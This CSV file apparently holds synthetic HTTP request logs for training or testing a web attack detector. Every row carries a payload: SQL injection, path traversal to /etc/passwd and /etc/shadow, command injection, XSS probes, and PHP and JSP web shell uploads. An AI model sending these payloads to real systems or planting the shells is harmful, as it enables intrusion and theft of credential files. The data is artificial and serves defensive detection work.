timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-01T18:20:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.61,7,1,11,0,200,1470
2025-01-01T18:21:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.55,19,1,55,1,500,1004
2025-01-01T18:22:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.75,2,1,11,0,500,751
2025-01-01T18:23:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.58,13,1,22,0,302,319
2025-01-01T18:24:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.2,3,1,8,0,302,1289
2025-01-01T18:25:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.89,19,1,55,1,500,445
2025-01-01T18:26:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.91,0,1,2,0,302,565
2025-01-01T18:27:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.59,2,1,11,0,200,779
2025-01-01T18:28:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.42,10,1,27,0,500,1399
2025-01-01T18:29:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.59,22,1,85,1,302,1414
2025-01-01T18:30:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.54,6,1,22,0,403,1524
2025-01-01T18:31:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.0,2,1,11,0,500,1591
2025-01-01T18:32:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.88,7,1,33,0,200,1384
2025-01-01T18:33:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.71,7,1,25,0,302,682
2025-01-01T18:34:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.47,19,1,55,1,403,1555
2025-01-01T18:35:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.81,6,1,21,0,200,789
2025-01-01T18:36:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.57,3,1,18,0,200,1001
2025-01-01T18:37:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.18,7,1,19,0,200,1554
2025-01-01T18:38:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.28,10,1,27,0,302,274
2025-01-01T18:39:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.91,6,1,21,0,302,688
2025-01-01T18:40:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.49,19,1,55,1,200,1191
2025-01-01T18:41:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.5,22,1,85,1,403,609
2025-01-01T18:42:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.94,10,1,27,0,200,1507
2025-01-01T18:43:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.87,3,1,15,0,200,353
2025-01-01T18:44:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.28,8,1,28,0,403,1540
2025-01-01T18:45:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.75,22,1,85,1,302,1296
2025-01-01T18:46:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.54,13,1,22,0,200,540
2025-01-01T18:47:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.33,3,1,18,0,500,402
2025-01-01T18:48:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.03,7,1,19,0,403,678
2025-01-01T18:49:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.97,6,1,21,0,403,892
2025-01-01T18:50:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.02,6,1,21,0,500,502
2025-01-01T18:51:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.72,6,1,21,0,500,800
2025-01-01T18:52:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.2,7,1,19,0,403,983
2025-01-01T18:53:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.93,6,1,21,0,500,295
2025-01-01T18:54:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.88,22,1,85,1,200,1557
2025-01-01T18:55:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.34,10,1,27,0,403,1153
2025-01-01T18:56:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.82,19,1,55,1,200,235
2025-01-01T18:57:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.47,3,1,18,0,500,724
2025-01-01T18:58:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.06,7,1,11,0,200,658
2025-01-01T18:59:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.01,0,1,6,0,200,471
2025-01-01T19:00:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.22,7,1,19,0,403,1095
2025-01-01T19:01:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.05,1,1,3,0,302,978
2025-01-01T19:02:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.45,6,1,22,0,500,256
2025-01-01T19:03:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.48,3,1,15,0,302,1551
2025-01-01T19:04:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.96,0,1,6,0,403,1283
2025-01-01T19:05:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.47,6,1,22,0,500,1012
2025-01-01T19:06:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.13,2,1,11,0,302,1317
2025-01-01T19:07:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.78,13,1,22,0,500,511
2025-01-01T19:08:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.1,3,1,18,0,500,661
2025-01-01T19:09:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.71,19,1,55,1,302,530
2025-01-01T19:10:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.12,0,1,6,0,302,1557
2025-01-01T19:11:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.36,13,1,22,0,200,638
2025-01-01T19:12:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.37,19,1,55,1,403,730
2025-01-01T19:13:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.66,7,1,33,0,200,472
2025-01-01T19:14:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.21,13,1,22,0,403,547
2025-01-01T19:15:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.41,10,1,27,0,403,209
2025-01-01T19:16:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.25,19,1,55,1,200,1233
2025-01-01T19:17:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.46,13,1,22,0,500,619
2025-01-01T19:18:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.95,7,1,33,0,403,1252
2025-01-01T19:19:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.06,7,1,19,0,500,1177
2025-01-01T19:20:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.6,2,1,11,0,302,1042
2025-01-01T19:21:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.11,7,1,33,0,403,1044
2025-01-01T19:22:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.74,13,1,22,0,500,1588
2025-01-01T19:23:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,6.23,1,1,3,0,200,1010
2025-01-01T19:24:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.23,19,1,55,1,200,1409
2025-01-01T19:25:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.19,6,1,21,0,500,1431
2025-01-01T19:26:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.47,10,1,27,0,403,201
2025-01-01T19:27:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.16,3,1,18,0,200,339
2025-01-01T19:28:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.76,7,1,33,0,500,1367
2025-01-01T19:29:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.27,19,1,55,1,500,1395
2025-01-01T19:30:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.66,19,1,55,1,500,1431
2025-01-01T19:31:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.81,6,1,22,0,302,734
2025-01-01T19:32:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.38,0,1,6,0,500,1360
2025-01-01T19:33:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.85,3,1,18,0,403,813
2025-01-01T19:34:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.76,22,1,85,1,302,1529
2025-01-01T19:35:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.83,7,1,11,0,302,980
2025-01-01T19:36:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.75,19,1,55,1,302,1337
2025-01-01T19:37:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.35,7,1,11,0,403,1192
2025-01-01T19:38:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.72,7,1,25,0,403,1283
2025-01-01T19:39:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,3.52,0,1,2,0,403,1578
2025-01-01T19:40:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.24,6,1,21,0,403,1144
2025-01-01T19:41:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,6.33,7,1,11,0,302,1492
2025-01-01T19:42:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.96,0,1,2,0,200,394
2025-01-01T19:43:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.86,7,1,11,0,200,353
2025-01-01T19:44:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.84,3,1,18,0,200,1169
2025-01-01T19:45:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.16,7,1,11,0,500,783
2025-01-01T19:46:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,3.72,1,1,3,0,500,1599
2025-01-01T19:47:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.34,6,1,21,0,200,529
2025-01-01T19:48:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.17,3,1,18,0,302,263
2025-01-01T19:49:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.12,19,1,55,1,200,233
2025-01-01T19:50:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.58,19,1,55,1,403,1296
2025-01-01T19:51:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.23,6,1,22,0,200,1182
2025-01-01T19:52:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.85,13,1,22,0,302,1234
2025-01-01T19:53:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.3,7,1,11,0,200,610
2025-01-01T19:54:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.29,7,1,19,0,403,779
2025-01-01T19:55:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.22,19,1,55,1,200,648
2025-01-01T19:56:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.76,19,1,55,1,200,1002
2025-01-01T19:57:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.25,3,1,18,0,200,948
2025-01-01T19:58:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.27,3,1,15,0,403,1011
2025-01-01T19:59:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.89,7,1,19,0,302,1462
2025-01-01T20:00:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.72,6,1,21,0,200,953
2025-01-01T20:01:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.74,6,1,21,0,500,329
2025-01-01T20:02:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.85,3,1,15,0,200,1056
2025-01-01T20:03:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.31,6,1,21,0,403,221
2025-01-01T20:04:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.19,7,1,33,0,500,436
2025-01-01T20:05:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.89,10,1,27,0,200,1231
2025-01-01T20:06:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.74,7,1,33,0,302,683
2025-01-01T20:07:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.19,3,1,8,0,403,1133
2025-01-01T20:08:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.51,0,1,6,0,403,1357
2025-01-01T20:09:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.61,3,1,15,0,302,235
2025-01-01T20:10:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.57,7,1,11,0,302,509
2025-01-01T20:11:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.42,7,1,19,0,302,1342
2025-01-01T20:12:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.27,6,1,21,0,302,1458
2025-01-01T20:13:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.69,10,1,27,0,200,220
2025-01-01T20:14:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.11,3,1,18,0,403,205
2025-01-01T20:15:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.45,19,1,55,1,200,694
2025-01-01T20:16:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.61,2,1,11,0,403,1432
2025-01-01T20:17:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.32,3,1,18,0,500,427
2025-01-01T20:18:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.88,13,1,22,0,500,1139
2025-01-01T20:19:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.48,7,1,25,0,500,931
2025-01-01T20:20:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.46,6,1,22,0,302,1465
2025-01-01T20:21:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.77,6,1,21,0,302,619
2025-01-01T20:22:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.17,3,1,8,0,403,863
2025-01-01T20:23:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.14,3,1,15,0,500,758
2025-01-01T20:24:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.55,6,1,22,0,302,1191
2025-01-01T20:25:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.07,19,1,55,1,500,1366
2025-01-01T20:26:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.63,10,1,27,0,302,1190
2025-01-01T20:27:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.98,10,1,27,0,200,1268
2025-01-01T20:28:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.27,1,1,3,0,403,1245
2025-01-01T20:29:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.12,6,1,22,0,200,781
2025-01-01T20:30:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.72,8,1,28,0,302,962
2025-01-01T20:31:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.46,19,1,55,1,500,1196
2025-01-01T20:32:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.73,10,1,27,0,200,498
2025-01-01T20:33:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.37,2,1,11,0,403,209
2025-01-01T20:34:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.77,22,1,85,1,500,1230
2025-01-01T20:35:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.36,7,1,19,0,403,1421
2025-01-01T20:36:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.45,13,1,22,0,500,236
2025-01-01T20:37:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.18,3,1,18,0,302,327
2025-01-01T20:38:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.44,2,1,11,0,500,1563
2025-01-01T20:39:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.93,22,1,85,1,403,772
2025-01-01T20:40:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.19,3,1,18,0,403,808
2025-01-01T20:41:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.59,22,1,85,1,200,358
2025-01-01T20:42:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.2,22,1,85,1,500,1191
2025-01-01T20:43:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,3.65,2,1,11,0,302,1305
2025-01-01T20:44:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.2,0,1,6,0,302,402
2025-01-01T20:45:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.27,7,1,11,0,403,598
2025-01-01T20:46:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.45,2,1,11,0,200,1087
2025-01-01T20:47:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.26,0,1,2,0,500,395
2025-01-01T20:48:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.42,1,1,3,0,403,947
2025-01-01T20:49:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.91,13,1,22,0,403,279
2025-01-01T20:50:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.13,22,1,85,1,200,1518
